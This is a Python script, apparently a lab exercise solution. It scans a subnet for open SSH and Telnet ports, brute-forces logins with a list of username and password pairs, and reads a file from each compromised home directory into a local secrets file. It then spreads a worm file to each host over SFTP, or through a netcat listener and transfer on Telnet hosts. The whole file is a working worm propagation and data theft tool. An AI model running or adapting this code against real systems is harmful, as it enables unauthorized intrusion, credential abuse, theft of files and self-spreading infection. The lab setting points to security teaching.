import socket
import paramiko
import telnetlib
import paramiko.client
import os #unnecessary?
import time
import subprocess
 
begin =time.time()
def find_vulnerable_machines():
    subnet = "10.13.4" 
    ports = [22, 23]  
    open_ports = {22: [], 23: []}  #for ssh and for telnet

    for i in range(256):  #loop through xyz.0 - xyz.255
        ip = f"{subnet}.{i}"
        for port in ports:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as soc:
                if soc.connect_ex((ip, port)) == 0:  
                    open_ports[port].append(ip)
                    # print(f"open port {port} found on {ip}")

    # Write open ports to log files
    with open("./open_ssh.log", "w") as ssh_log, open("./open_telnet.log", "w") as telnet_log:
        for port, ips in open_ports.items():
            log_file = ssh_log if port == 22 else telnet_log
            for ip in ips:
                log_file.write(f"{ip}\n")
   
def _ssh_connect(i,user,passwd):
    try:
        client=paramiko.client.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(i,username=user,password=passwd)                        
        client.close()
        return True
    except paramiko.SSHException as e:
        print(f"SSH connection error with {i}: {str(e)}")
        return False
    except Exception as e:
        print(f"Unexpected error with SSH connection to {i}: {e}")
        return False

def _tel_connect(i,user,passwd):
    try:
        telnt=telnetlib.Telnet(i)
        telnt.read_until(b"login: ")
        telnt.write(user.encode('ascii') + b"\n")
        telnt.read_until(b"Password: ")
        telnt.write(passwd.encode('ascii') + b"\n")

        output = telnt.read_until(b">", timeout=7).decode('ascii')
        print(output)
        if "incorrect" not in output: #Login failed
            return True 
        telnt.close()
        
    except Exception as e:
        print(f"Error: {e}")
        return False

def find_vulnerable_accounts():
    with open("/home/cse/Lab2/Q2pwd", "r") as Q2pwd:
        userpass = []
        for line in Q2pwd:
            line = line.strip()
            if ' ' in line:   
                parts = line.split(' ')   
                user = parts[0]
                passwd = ' '.join(parts[1:])  #is there a better way?
                userpass.append((user, passwd))

    with open("/home/cse/Lab2/Solutions/Q2/open_ssh.log", "r") as ssh_log, \
         open("/home/cse/Lab2/Solutions/Q2/ssh_accounts.log", "w") as ssh_acct_log:
        
        for line in ssh_log:
            ip = line.strip()  # Remove extra spaces or newlines
            for user, passwd in userpass:
                if _ssh_connect(ip, user, passwd):  
                    ssh_acct_log.write(f"{ip},{user},{passwd}\n")

    with open("/home/cse/Lab2/Solutions/Q2/open_telnet.log", "r") as telnet_log, \
         open("/home/cse/Lab2/Solutions/Q2/telnet_accounts.log", "w") as telnet_acct_log:
        
        for line in telnet_log:
            ip = line.strip()
            for user, passwd in userpass:
                if _tel_connect(ip, user, passwd):  
                    telnet_acct_log.write(f"{ip},{user},{passwd}\n")

# find_vulnerable_accounts()

#extra n infect ssh
#extract n infect telnt


def extract_and_infect():
    with open("/home/cse/Lab2/Solutions/Q2/ssh_accounts.log", "r") as ssh_users:
        for line in ssh_users:
            line = line.strip()  
            if ',' in line:   
                parts = line.split(',')   
                ip = parts[0]
                user = parts[1]
                passwd = parts[2]

                client=paramiko.client.SSHClient()
                client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                try:
                    client.connect(ip,username=user,password=passwd)                        

                    stdin, stdout, stderr = client.exec_command('echo $HOME')
                    home_dir=stdout.read().decode('utf-8').strip() 

                    sftp = client.open_sftp()
                    sftp.chdir(home_dir)

                    worm_path="/home/cse/Lab2/Solutions/Q2/Q2worm.py"
                    
                    files = sftp.listdir(home_dir)

                    with sftp.open(f"{home_dir}"+'/'+files[1],"r") as secret:
                        content=secret.read()
                        print(f"Content of {files[1]} from ssh:")
                        file_cont=content.decode('utf-8').strip()
                        print(file_cont)

                    sftp.put(worm_path,home_dir +"/Q2worm.py")
                    sftp.close()
                   
                except Exception as e:
                    print(f"An unexpected error occurred for {user}@{ip}: {e}")
                finally:
                    client.close()
        with open("/home/cse/Lab2/Solutions/Q2secrets","w") as Q2secrets:
            Q2secrets.write(f"{file_cont}\n")
  

    with open("/home/cse/Lab2/Solutions/Q2/telnet_accounts.log", "r") as telnet_user:
        for line in telnet_user:
            line = line.strip()
            if ',' in line:   
                parts = line.split(',')   
                ip = parts[0]
                user = parts[1]
                passwd = parts[2]


                telnt=telnetlib.Telnet(ip)
                try:
                    telnt.read_until(b"login: ")
                    telnt.write(user.encode('ascii') + b"\n")
                    telnt.read_until(b"Password: ")
                    telnt.write(passwd.encode('ascii') + b"\n")

                    telnt.read_until(b"$ ")

                    telnt.write(b"echo $HOME\n")
                    output = telnt.read_until(b"$ ").decode('ascii')
                    home_directory = output.split("\n")[-2].strip()


                    telnt.write(f"ls {home_directory}\n".encode('ascii'))
                    output = telnt.read_until(b"$ ").decode('ascii').strip()
                    file_output=output.split("\n")[-2].strip()
                    le_output=file_output.split(" ")

                    telnt.write(f"cat {home_directory}/{le_output[0]}\n".encode('ascii'))
                    file_contents = telnt.read_until(b"$ ").decode('ascii').strip()
                    file_contents=file_contents.split("\n")[-2].strip()
                    print(f"Contents of {le_output[0]} for {user} at {ip}:\n{file_contents}\n")

                    with open("/home/cse/Lab2/Solutions/Q2secrets","a") as Q2secrets:
                        Q2secrets.write(f"{file_contents}\n")

                    worm_path="/home/cse/Lab2/Solutions/Q2/Q2worm.py"
                    telnt.write(b"nc -l -p 1234 > Q2worm.py\n") #should i encode?
                    subprocess.run([f"nc -w 5 {ip} 1234 < Q2worm.py"], shell=True)

                    # telnt.read_until(b"$ ")

                    print(f"Files in home_directory after transferring Q2worm.py:\n{output}\n")

                except Exception as e:
                    print(f"Error: {e}")
                finally:
                    telnt.close()


extract_and_infect()
end=time.time()
print(end-begin)


